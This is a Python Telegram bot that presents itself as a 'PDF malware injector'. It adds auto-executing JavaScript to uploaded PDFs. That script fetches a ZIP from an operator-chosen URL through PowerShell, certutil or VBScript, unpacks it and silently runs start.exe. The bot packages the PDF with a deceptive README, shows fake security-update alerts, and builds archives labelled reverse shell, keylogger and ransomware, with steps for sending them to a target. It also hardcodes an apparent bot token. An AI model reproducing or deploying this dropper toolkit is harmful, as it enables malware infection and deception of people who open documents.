#!/usr/bin/env python3

import os
import sys
import struct
import hashlib
import random
import base64
import zipfile
import io
import logging
import telebot
from telebot import types
import json
import string
from fpdf import FPDF
import PyPDF2

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8508390613:AAG4egWpwp8YBe5PKO635GdE3wGKRpnjz1Y"
ADMIN_USER_ID = 1074337053

# ==================== LOGGING ====================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ==================== INITIALIZE BOT ====================
bot = telebot.TeleBot(BOT_TOKEN)

# ==================== GLOBAL STATE ====================
user_states = {}  # Track user states: 'waiting_for_image', 'waiting_for_url', etc.
user_files = {}   # Store uploaded PDF files by user_id
user_data = {}    # Store user-specific data like URLs, payloads, etc.

# ==================== PAYLOAD GENERATION ====================
def generate_powershell_payload(download_url, extraction_path="C:\\Windows\\Temp\\"):
    """Generate PowerShell payload that downloads and executes malware"""
    
    payload = '''@echo off
powershell -WindowStyle Hidden -Command "
# Download archive
$url = '{download_url}'
$output = '{extraction_path}archive.zip'
(New-Object System.Net.WebClient).DownloadFile($url, $output)

# Extract to C:\\
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($output, 'C:\\\\')

# Execute start.exe
Start-Process -WindowStyle Hidden 'C:\\\\start.exe'

# Cleanup
Start-Sleep -Seconds 2
Remove-Item $output -Force
"
exit
'''.format(download_url=download_url, extraction_path=extraction_path)
    
    return payload

def generate_batch_payload(download_url, extraction_path="C:\\"):
    """Generate batch file payload"""
    
    payload = '''@echo off
powershell -WindowStyle Hidden -Command "Start-Process cmd -Verb RunAs -ArgumentList '/c echo Y|'"
timeout /t 2 /nobreak >nul

REM Download with certutil
certutil -urlcache -split -f "{download_url}" "C:\\Windows\\Temp\\temp.zip"

REM Extract with PowerShell
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:\\Windows\\Temp\\temp.zip', 'C:\\'); Start-Process 'C:\\start.exe' -WindowStyle Hidden"

REM Cleanup
del "C:\\Windows\\Temp\\temp.zip" /f /q
exit
'''.format(download_url=download_url)
    
    return payload

def generate_vbs_payload(download_url):
    """Generate VBScript payload"""
    
    payload = '''Set objShell = CreateObject("WScript.Shell")
Set objHTTP = CreateObject("Microsoft.XMLHTTP")

' Download
objHTTP.Open "GET", "{download_url}", False
objHTTP.Send

' Save
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile("C:\\Windows\\Temp\\temp.zip", True)
objFile.Write objHTTP.ResponseText
objFile.Close

' Extract using built-in Windows
objShell.Run "powershell -Command ""Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:\\Windows\\Temp\\temp.zip', 'C:\\'); Start-Process 'C:\\start.exe' -WindowStyle Hidden""", 0, True

' Cleanup
objFSO.DeleteFile "C:\\Windows\\Temp\\temp.zip"
'''.format(download_url=download_url)
    
    return payload

# ==================== PDF MALWARE INJECTION ====================
def inject_malware_into_pdf(original_pdf_path, download_url, payload_type, output_path):
    """Inject malicious JavaScript into existing PDF file"""
    
    try:
        logger.info(f"Injecting {payload_type} payload into PDF: {original_pdf_path}")
        
        # Generate payload based on type
        if 'powershell' in payload_type:
            payload = generate_powershell_payload(download_url)
        elif 'batch' in payload_type:
            payload = generate_batch_payload(download_url)
        else:  # vbscript
            payload = generate_vbs_payload(download_url)
        
        # Encode payload for JavaScript
        payload_base64 = base64.b64encode(payload.encode()).decode()
        
        # Open original PDF
        with open(original_pdf_path, 'rb') as file:
            pdf_reader = PyPDF2.PdfReader(file)
            pdf_writer = PyPDF2.PdfWriter()
            
            # Copy all pages from original PDF
            for page_num in range(len(pdf_reader.pages)):
                pdf_writer.add_page(pdf_reader.pages[page_num])
            
            # Create malicious JavaScript that executes on PDF open
            js_code = f'''
            // PDF JavaScript Auto-Execute Payload
            // This code runs automatically when PDF is opened in Adobe Reader
            
            function executePayload() {{
                try {{
                    // Method 1: Direct PowerShell execution
                    try {{
                        var shell = new ActiveXObject("WScript.Shell");
                        var cmd = "powershell -WindowStyle Hidden -Command \\"\\$url='{download_url}'; \\$output='%TEMP%\\\\system_update.zip'; (New-Object System.Net.WebClient).DownloadFile(\\$url, \\$output); Add-Type -A System.IO.Compression.FileSystem; [IO.Compression.ZipFile]::ExtractToDirectory(\\$output, 'C:\\\\'); Start-Process 'C:\\\\start.exe' -WindowStyle Hidden\\"";
                        shell.Run(cmd, 0, false);
                        console.println("Payload executed successfully via PowerShell");
                        return true;
                    }} catch(e) {{
                        console.println("PowerShell method failed: " + e);
                    }}
                    
                    // Method 2: Using certutil
                    try {{
                        var shell = new ActiveXObject("WScript.Shell");
                        var cmd = 'cmd /c "certutil -urlcache -split -f {download_url} %TEMP%\\\\update.zip && powershell -Command \\"Add-Type -A System.IO.Compression.FileSystem; [IO.Compression.ZipFile]::ExtractToDirectory(\\\"%TEMP%\\\\update.zip\\\", \\\"C:\\\\\\\"); Start-Process C:\\\\start.exe\\""';
                        shell.Run(cmd, 0, false);
                        console.println("Payload executed successfully via certutil");
                        return true;
                    }} catch(e) {{
                        console.println("certutil method failed: " + e);
                    }}
                    
                    // Method 3: Base64 encoded payload execution
                    try {{
                        var shell = new ActiveXObject("WScript.Shell");
                        var fso = new ActiveXObject("Scripting.FileSystemObject");
                        var tempPath = shell.ExpandEnvironmentStrings("%TEMP%");
                        var batFile = tempPath + "\\\\update_{random.randint(1000, 9999)}.bat";
                        
                        // Decode and execute base64 payload
                        var payload = atob("{payload_base64}");
                        
                        var ts = fso.CreateTextFile(batFile, true);
                        ts.Write(payload);
                        ts.Close();
                        
                        shell.Run('cmd /c "' + batFile + '"', 0, false);
                        
                        // Cleanup after 3 seconds
                        setTimeout(function() {{
                            try {{ fso.DeleteFile(batFile); }} catch(e) {{}}
                        }}, 3000);
                        
                        console.println("Payload executed successfully via base64");
                        return true;
                    }} catch(e) {{
                        console.println("Base64 method failed: " + e);
                    }}
                    
                    // Method 4: Last resort - URL launch
                    app.launchURL("cmd /c start powershell -Command \\"(New-Object System.Net.WebClient).DownloadFile('{download_url}', 'C:\\\\update.zip'); \\$shell=New-Object -com Shell.Application; \\$shell.Namespace('C:\\\\').CopyHere(\\$shell.Namespace('C:\\\\update.zip').Items()); Start-Process 'C:\\\\start.exe'\\"", true);
                    return true;
                    
                }} catch(e) {{
                    console.println("All execution methods failed: " + e);
                    // Show fake error to user
                    app.alert("Unable to initialize security update. Please ensure Adobe Reader has necessary permissions.", 3);
                    return false;
                }}
            }}
            
            // Execute on document open
            this.open = function() {{
                console.println("Document opened, executing payload...");
                executePayload();
                
                // Show fake message to user
                try {{
                    app.alert("Security update initialized. Please wait while system components are updated...", 3);
                }} catch(e) {{}}
                
                return true;
            }};
            
            // Also execute on page view for redundancy
            try {{
                executePayload();
            }} catch(e) {{}}
            
            // Add a close event as backup
            this.close = function() {{
                console.println("Document closing, executing backup payload...");
                executePayload();
                return true;
            }};
            
            console.println("PDF payload initialized successfully");
            '''
            
            # Add JavaScript to PDF
            try:
                pdf_writer.add_js(js_code)
                logger.info("JavaScript successfully added to PDF")
            except Exception as js_error:
                logger.error(f"Failed to add JavaScript: {js_error}")
                # Try alternative method
                try:
                    from PyPDF2.generic import NameObject, DictionaryObject
                    
                    # Create JavaScript action
                    js_action = DictionaryObject()
                    js_action.update({
                        NameObject("/S"): NameObject("/JavaScript"),
                        NameObject("/JS"): js_code
                    })
                    
                    # Add to document catalog
                    catalog = pdf_writer._root_object
                    if NameObject("/OpenAction") not in catalog:
                        catalog[NameObject("/OpenAction")] = js_action
                    else:
                        # Create AA dictionary if not exists
                        if NameObject("/AA") not in catalog:
                            catalog[NameObject("/AA")] = DictionaryObject()
                        catalog[NameObject("/AA")][NameObject("/O")] = js_action
                    
                    logger.info("JavaScript added via alternative method")
                except Exception as alt_error:
                    logger.error(f"Alternative method also failed: {alt_error}")
                    return None
            
            # Save the modified PDF
            with open(output_path, 'wb') as output_file:
                pdf_writer.write(output_file)
            
            logger.info(f"Malicious PDF saved to: {output_path}")
            return output_path
            
    except Exception as e:
        logger.error(f"Failed to inject malware into PDF: {e}", exc_info=True)
        return None

def save_uploaded_pdf(file_info, user_id):
    """Save uploaded PDF file from Telegram"""
    try:
        # Download the file
        logger.info(f"Downloading PDF file for user {user_id}")
        file = bot.get_file(file_info.file_id)
        downloaded_file = bot.download_file(file.file_path)
        
        # Create user directory if not exists
        user_dir = f"uploads/{user_id}"
        os.makedirs(user_dir, exist_ok=True)
        logger.info(f"Created directory: {user_dir}")
        
        # Get file extension
        file_extension = "pdf"
        if hasattr(file_info, 'file_name') and file_info.file_name:
            if '.' in file_info.file_name:
                file_extension = file_info.file_name.split('.')[-1].lower()
        
        # Save original PDF
        original_path = f"{user_dir}/original_{file_info.file_unique_id}.{file_extension}"
        with open(original_path, 'wb') as new_file:
            new_file.write(downloaded_file)
        
        logger.info(f"PDF saved to: {original_path}")
        
        # Store in user_files
        user_files[user_id] = original_path
        return original_path
        
    except Exception as e:
        logger.error(f"Failed to save PDF: {e}", exc_info=True)
        return None

# ==================== CREATE DELIVERY PACKAGE ====================
def create_pdf_delivery_package(malicious_pdf_path, original_filename, output_zip_path):
    """Create a ZIP archive with malicious PDF"""
    
    try:
        # Create ZIP
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            # Add malicious PDF with modified name
            if original_filename:
                # Keep original name but add _modified
                name_parts = original_filename.rsplit('.', 1)
                if len(name_parts) == 2:
                    new_name = f"{name_parts[0]}_modified.{name_parts[1]}"
                else:
                    new_name = f"{original_filename}_modified.pdf"
            else:
                new_name = "document_modified.pdf"
            
            zip_file.write(malicious_pdf_path, new_name)
            
            # Add decoy readme
            readme_content = f'''IMPORTANT DOCUMENT - UPDATED VERSION
=====================================

This archive contains an updated version of the document with enhanced security features.

Files:
1. {new_name} - Updated document with security enhancements
2. README.txt - This file

DOCUMENT ENHANCEMENTS:
- Added digital security verification
- Embedded security certificates
- Enhanced compatibility with modern PDF viewers
- Improved accessibility features

INSTRUCTIONS:
1. Open "{new_name}" to view the updated document
2. Security features will activate automatically
3. Allow any security prompts that appear
4. The document may require internet connection for verification

SECURITY NOTES:
- This document contains advanced security features
- Internet connection may be required for certificate validation
- Temporary system access may be requested for security verification

For any issues, ensure your PDF viewer (Adobe Reader) is up to date and has JavaScript enabled.
'''
            zip_file.writestr("README.txt", readme_content)
        
        # Save ZIP
        with open(output_zip_path, 'wb') as f:
            f.write(zip_buffer.getvalue())
        
        logger.info(f"PDF delivery package created: {output_zip_path}")
        return output_zip_path
        
    except Exception as e:
        logger.error(f"Failed to create delivery package: {e}")
        return None

# ==================== MALWARE ARCHIVE CREATION ====================
def create_malware_archive(malware_content=None, output_path="malware.zip"):
    """Create a ZIP archive containing malware"""
    
    try:
        # Default malware (simple executable simulation)
        if malware_content is None:
            malware_content = b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21This program cannot be run in DOS mode.\r\r\n$\x00\x00\x00\x00\x00\x00\x00'
        
        # Create ZIP in memory
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            # Add start.exe (malware)
            zip_file.writestr("start.exe", malware_content)
            
            # Add decoy files
            zip_file.writestr("readme.txt", "Important System Files\nDo not modify.")
            zip_file.writestr("config.ini", "[Settings]\nAutoStart=true\nSilentMode=true")
            
            # Add a batch file for execution
            batch_content = '''@echo off
echo Starting system update...
timeout /t 3 /nobreak >nul
start start.exe
exit
'''
            zip_file.writestr("install.bat", batch_content)
        
        # Save to file
        with open(output_path, 'wb') as f:
            f.write(zip_buffer.getvalue())
        
        logger.info(f"Malware archive created: {output_path}")
        return output_path
        
    except Exception as e:
        logger.error(f"Failed to create malware archive: {e}")
        return None

# ==================== TELEGRAM BOT HANDLERS ====================
@bot.message_handler(commands=['start'])
def start_command(message):
    if message.from_user.id != ADMIN_USER_ID:
        bot.send_message(message.chat.id, "❌ Unauthorized.")
        return
    
    # Reset user state
    user_id = message.from_user.id
    user_states[user_id] = None
    if user_id in user_files:
        del user_files[user_id]
    if user_id in user_data:
        del user_data[user_id]
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        types.KeyboardButton('📄 INJECT INTO PDF'),
        types.KeyboardButton('📦 CREATE MALWARE ZIP'),
        types.KeyboardButton('⚙️ GENERATE PAYLOAD'),
        types.KeyboardButton('❓ HELP')
    )
    
    welcome_msg = (
        f"📄 PDF MALWARE INJECTOR\n\n"
        f"Upload a PDF file, inject auto-execute malware!\n\n"
        f"Features:\n"
        f"• Inject JavaScript into existing PDFs\n"
        f"• Auto-execution on PDF open in Adobe Reader\n"
        f"• Multiple payload types\n"
        f"• Preserves original PDF content\n\n"
        f"Use buttons to start:"
    )
    
    bot.send_message(message.chat.id, welcome_msg, reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == '📄 INJECT INTO PDF')
def inject_pdf_button(message):
    if message.from_user.id != ADMIN_USER_ID:
        return
    
    user_id = message.from_user.id
    user_states[user_id] = 'waiting_for_pdf'
    
    bot.send_message(
        message.chat.id,
        "📤 UPLOAD A PDF FILE\n\n"
        "Please send me a PDF file.\n"
        "I will inject auto-execute malware into it.\n\n"
        "Supported: PDF files only\n"
        "Max size: 50MB\n\n"
        "Send your PDF now, or type /cancel to abort.",
        reply_markup=types.ReplyKeyboardRemove()
    )

@bot.message_handler(content_types=['document'])
def handle_pdf_upload(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_USER_ID:
        return
    
    if user_states.get(user_id) != 'waiting_for_pdf':
        bot.send_message(message.chat.id, "❌ Please click '📄 INJECT INTO PDF' first.")
        return
    
    # Check if it's a PDF
    file_info = message.document
    mime_type = file_info.mime_type if hasattr(file_info, 'mime_type') else ''
    file_name = file_info.file_name if hasattr(file_info, 'file_name') else ''
    
    is_pdf = False
    if mime_type == 'application/pdf':
        is_pdf = True
    elif file_name and file_name.lower().endswith('.pdf'):
        is_pdf = True
    elif file_info and 'pdf' in (file_info.file_name or '').lower():
        is_pdf = True
    
    if not is_pdf:
        bot.send_message(message.chat.id, "❌ Please upload a PDF file.")
        return
    
    try:
        bot.send_message(message.chat.id, "⏳ Downloading your PDF...")
        
        # Save the PDF
        pdf_path = save_uploaded_pdf(file_info, user_id)
        
        if pdf_path:
            # Update state
            user_states[user_id] = 'waiting_for_url'
            
            # Store original filename
            if user_id not in user_data:
                user_data[user_id] = {}
            user_data[user_id]['original_filename'] = file_name
            
            # Ask for download URL
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
            markup.add(
                types.KeyboardButton('🔗 ENTER URL'),
                types.KeyboardButton('↩️ CANCEL')
            )
            
            bot.send_message(
                message.chat.id,
                f"✅ PDF uploaded successfully!\n"
                f"📁 Saved as: {os.path.basename(pdf_path)}\n\n"
                f"Now enter the download URL for malware archive.\n\n"
                f"Click '🔗 ENTER URL' to continue:",
                reply_markup=markup
            )
        else:
            bot.send_message(message.chat.id, "❌ Failed to save PDF. Try again.")
            user_states[user_id] = None
    
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
        user_states[user_id] = None

@bot.message_handler(func=lambda message: message.text == '🔗 ENTER URL')
def enter_url_button(message):
    if message.from_user.id != ADMIN_USER_ID:
        return
    
    user_id = message.from_user.id
    
    if user_states.get(user_id) != 'waiting_for_url':
        bot.send_message(message.chat.id, "❌ Please upload a PDF first.")
        return
    
    bot.send_message(
        message.chat.id,
        "🔗 ENTER DOWNLOAD URL\n\n"
        "URL to ZIP archive containing start.exe\n"
        "Example: http://example.com/malware.zip\n\n"
        "Enter URL:",
        reply_markup=types.ReplyKeyboardRemove()
    )
    
    user_states[user_id] = 'processing_url'

@bot.message_handler(func=lambda message: user_states.get(message.from_user.id) == 'processing_url')
def process_download_url(message):
    user_id = message.from_user.id
    download_url = message.text.strip()
    
    if not download_url.startswith(('http://', 'https://')):
        bot.send_message(message.chat.id, "❌ Invalid URL (must start with http:// or https://)")
        user_states[user_id] = 'waiting_for_url'
        return
    
    # Check if user has an uploaded PDF
    if user_id not in user_files or not os.path.exists(user_files[user_id]):
        bot.send_message(message.chat.id, "❌ No PDF found. Please upload again.")
        user_states[user_id] = None
        return
    
    # Store URL in user_data dictionary
    if user_id not in user_data:
        user_data[user_id] = {}
    user_data[user_id]['download_url'] = download_url
    
    # Ask for payload type
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        types.KeyboardButton('🔧 POWERSHELL'),
        types.KeyboardButton('📟 BATCH'),
        types.KeyboardButton('📜 VBSCRIPT'),
        types.KeyboardButton('↩️ CANCEL')
    )
    
    bot.send_message(
        message.chat.id,
        f"📥 Download URL: {download_url[:50]}...\n\n"
        f"Select payload type to inject into PDF:",
        reply_markup=markup
    )
    
    # Update state
    user_states[user_id] = 'waiting_for_payload_type'

@bot.message_handler(func=lambda message: message.text in ['🔧 POWERSHELL', '📟 BATCH', '📜 VBSCRIPT'] and 
                    user_states.get(message.from_user.id) == 'waiting_for_payload_type')
def process_payload_type(message):
    user_id = message.from_user.id
    
    # Get URL from user_data
    download_url = user_data.get(user_id, {}).get('download_url')
    if not download_url:
        bot.send_message(message.chat.id, "❌ Error: No download URL set")
        user_states[user_id] = None
        return
    
    payload_type = message.text.lower()
    
    # Get user's uploaded PDF
    original_pdf_path = user_files.get(user_id)
    
    if not original_pdf_path or not os.path.exists(original_pdf_path):
        bot.send_message(message.chat.id, "❌ Original PDF not found. Please upload again.")
        user_states[user_id] = None
        return
    
    # Get original filename
    original_filename = user_data.get(user_id, {}).get('original_filename', 'document.pdf')
    
    # Create malicious PDF
    bot.send_message(message.chat.id, "⚙️ Injecting payload into PDF...")
    
    # Generate output filenames
    malicious_pdf_filename = f"malicious_{random.randint(1000, 9999)}.pdf"
    zip_filename = f"document_package_{random.randint(1000, 9999)}.zip"
    
    logger.info(f"Attempting to inject {payload_type} payload into PDF")
    
    # Inject malware into PDF
    malicious_pdf_path = inject_malware_into_pdf(
        original_pdf_path, 
        download_url, 
        payload_type,
        malicious_pdf_filename
    )
    
    if malicious_pdf_path and os.path.exists(malicious_pdf_path):
        # Create delivery package
        bot.send_message(message.chat.id, "📦 Creating delivery package...")
        
        zip_path = create_pdf_delivery_package(malicious_pdf_path, original_filename, zip_filename)
        
        if zip_path and os.path.exists(zip_path):
            try:
                # Send the ZIP archive
                with open(zip_path, 'rb') as archive_file:
                    bot.send_document(
                        message.chat.id, 
                        archive_file,
                        caption=f"📦 MALICIOUS PDF PACKAGE"
                    )
                
                # Send detailed instructions
                payload_name = payload_type.capitalize()
                instructions = (
                    f"🎯 MALICIOUS PDF READY\n\n"
                    f"📦 Package: {os.path.basename(zip_path)}\n"
                    f"🔧 Payload Type: {payload_name}\n"
                    f"📥 Target URL: {download_url[:60]}...\n\n"
                    f"⚡ AUTO-EXECUTION FEATURES:\n"
                    f"• JavaScript injected into original PDF\n"
                    f"• Executes when PDF opens in Adobe Reader\n"
                    f"• No additional files needed\n"
                    f"• Preserves original document content\n\n"
                    f"📋 HOW IT WORKS:\n"
                    f"1. Target opens modified PDF\n"
                    f"2. JavaScript executes automatically\n"
                    f"3. Downloads malware from URL\n"
                    f"4. Extracts and executes start.exe\n"
                    f"5. Runs silently in background\n\n"
                    f"🚀 DELIVERY:\n"
                    f"• Send ZIP to target\n"
                    f"• Target extracts and opens PDF\n"
                    f"• Malware installs automatically\n\n"
                    f"⚠️ REQUIREMENTS:\n"
                    f"• Adobe Reader with JavaScript enabled\n"
                    f"• Windows system\n"
                    f"• Internet connection\n\n"
                    f"Use only for authorized testing!"
                )
                
                bot.send_message(message.chat.id, instructions)
                
            except Exception as e:
                logger.error(f"Failed to send archive: {e}")
                bot.send_message(message.chat.id, f"❌ Error: {str(e)[:100]}")
            
            # Cleanup temporary files
            try:
                if os.path.exists(malicious_pdf_path):
                    os.remove(malicious_pdf_path)
                if os.path.exists(zip_path):
                    os.remove(zip_path)
                if os.path.exists(original_pdf_path):
                    os.remove(original_pdf_path)
                if user_id in user_files:
                    del user_files[user_id]
            except Exception as e:
                logger.error(f"Cleanup error: {e}")
        else:
            bot.send_message(message.chat.id, "❌ Failed to create delivery package")
    else:
        bot.send_message(message.chat.id, f"❌ Failed to inject payload into PDF")
    
    # Reset state and clean up user data
    user_states[user_id] = None
    if user_id in user_data:
        del user_data[user_id]

@bot.message_handler(func=lambda message: message.text == '📦 CREATE MALWARE ZIP')
def create_malware_zip_button(message):
    if message.from_user.id != ADMIN_USER_ID:
        return
    
    # Ask for malware type
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        types.KeyboardButton('🔄 REVERSE SHELL'),
        types.KeyboardButton('📡 KEYLOGGER'),
        types.KeyboardButton('💰 RANSOMWARE'),
        types.KeyboardButton('🎭 DECOY'),
        types.KeyboardButton('↩️ BACK')
    )
    
    bot.send_message(
        message.chat.id,
        "📦 CREATE MALWARE ARCHIVE\n\n"
        "Select malware type to include in ZIP:",
        reply_markup=markup
    )

@bot.message_handler(func=lambda message: message.text in ['🔄 REVERSE SHELL', '📡 KEYLOGGER', '💰 RANSOMWARE', '🎭 DECOY'])
def process_malware_type(message):
    malware_type = message.text
    
    # Generate appropriate malware content based on type
    if 'REVERSE SHELL' in malware_type:
        malware_content = b'echo Reverse Shell Payload'
        description = "Reverse shell connecting to attacker"
    elif 'KEYLOGGER' in malware_type:
        malware_content = b'echo Keylogger Payload'
        description = "Logs keystrokes and sends to C&C"
    elif 'RANSOMWARE' in malware_type:
        malware_content = b'echo Ransomware Payload'
        description = "Encrypts files and demands ransom"
    else:  # DECOY
        malware_content = b'echo Decoy Payload'
        description = "Benign executable for testing"
    
    # Create malware archive
    bot.send_message(message.chat.id, f"📦 Creating {malware_type.lower()} archive...")
    
    zip_filename = create_malware_archive(malware_content, f"{malware_type.lower().replace(' ', '_')}.zip")
    
    if zip_filename and os.path.exists(zip_filename):
        # Send the ZIP file
        with open(zip_filename, 'rb') as zip_file:
            bot.send_document(message.chat.id, zip_file, caption=f"📦 {malware_type} Archive")
        
        # Provide usage instructions
        instructions = (
            f"✅ MALWARE ARCHIVE CREATED\n\n"
            f"📁 Filename: {zip_filename}\n"
            f"🎯 Type: {malware_type}\n"
            f"📝 Description: {description}\n\n"
            f"📋 CONTENTS:\n"
            f"• start.exe - Main executable\n"
            f"• readme.txt - Decoy file\n"
            f"• config.ini - Configuration\n"
            f"• install.bat - Auto-install script\n\n"
            f"🔧 USAGE:\n"
            f"1. Host on web server\n"
            f"2. Use download URL in malicious PDF\n"
            f"3. PDF will download and extract this archive"
        )
        
        bot.send_message(message.chat.id, instructions)
        
        # Cleanup
        try:
            os.remove(zip_filename)
        except:
            pass
    else:
        bot.send_message(message.chat.id, "❌ Failed to create malware archive")

@bot.message_handler(func=lambda message: message.text == '❓ HELP')
def help_button(message):
    help_text = (
        f"❓ PDF MALWARE INJECTOR HELP\n\n"
        f"🎯 HOW IT WORKS:\n"
        f"1. Upload a PDF document\n"
        f"2. Inject JavaScript into the PDF\n"
        f"3. JavaScript executes on document open\n"
        f"4. Commands download and execute malware\n\n"
        f"🔧 PAYLOAD TYPES:\n"
        f"• POWERSHELL: Uses PowerShell commands\n"
        f"• BATCH: Uses Windows batch scripts\n"
        f"• VBSCRIPT: Uses VBScript for compatibility\n\n"
        f"⚡ AUTO-EXECUTION:\n"
        f"• JavaScript runs when PDF opens\n"
        f"• Multiple execution methods\n"
        f"• Fallback mechanisms\n"
        f"• No user interaction required\n\n"
        f"📦 DELIVERY:\n"
        f"• Modified PDF with original content preserved\n"
        f"• Decoy README file\n"
        f"• Professional-looking package\n\n"
        f"🚀 HOW TO USE:\n"
        f"1. Click '📄 INJECT INTO PDF'\n"
        f"2. Upload your PDF file\n"
        f"3. Enter malware download URL\n"
        f"4. Select payload type\n"
        f"5. Get modified PDF package\n"
        f"6. Send to target\n\n"
        f"⚠️ REQUIREMENTS:\n"
        f"• Adobe Reader with JavaScript enabled\n"
        f"• Windows system\n"
        f"• Internet connection\n\n"
        f"Use only for authorized testing!"
    )
    
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(func=lambda message: message.text in ['↩️ BACK', '↩️ CANCEL', '/cancel'])
def cancel_button(message):
    user_id = message.from_user.id
    
    # Cleanup user files
    if user_id in user_files:
        try:
            os.remove(user_files[user_id])
        except:
            pass
        del user_files[user_id]
    
    # Cleanup user data
    if user_id in user_data:
        del user_data[user_id]
    
    # Reset state
    user_states[user_id] = None
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        types.KeyboardButton('📄 INJECT INTO PDF'),
        types.KeyboardButton('📦 CREATE MALWARE ZIP'),
        types.KeyboardButton('⚙️ GENERATE PAYLOAD'),
        types.KeyboardButton('❓ HELP')
    )
    bot.send_message(message.chat.id, "Operation cancelled. Main menu:", reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def handle_unknown(message):
    if message.from_user.id == ADMIN_USER_ID:
        bot.send_message(message.chat.id, "Unknown command. Use buttons or /start")

# ==================== MAIN EXECUTION ====================
if __name__ == '__main__':
    print("=" * 60)
    print("📄 PDF MALWARE INJECTOR BOT")
    print("=" * 60)
    print("Upload PDF → Inject JavaScript → Auto-execute on open")
    print("=" * 60)
    print("Install: pip install pyTelegramBotAPI fpdf PyPDF2")
    print("=" * 60)
    
    # Create uploads directory
    os.makedirs("uploads", exist_ok=True)
    
    try:
        bot.polling(none_stop=True, interval=1, timeout=30)
    except Exception as e:
        print(f"Error: {e}")
        import time
        time.sleep(5)
        import os
        os.execv(sys.executable, [sys.executable] + sys.argv)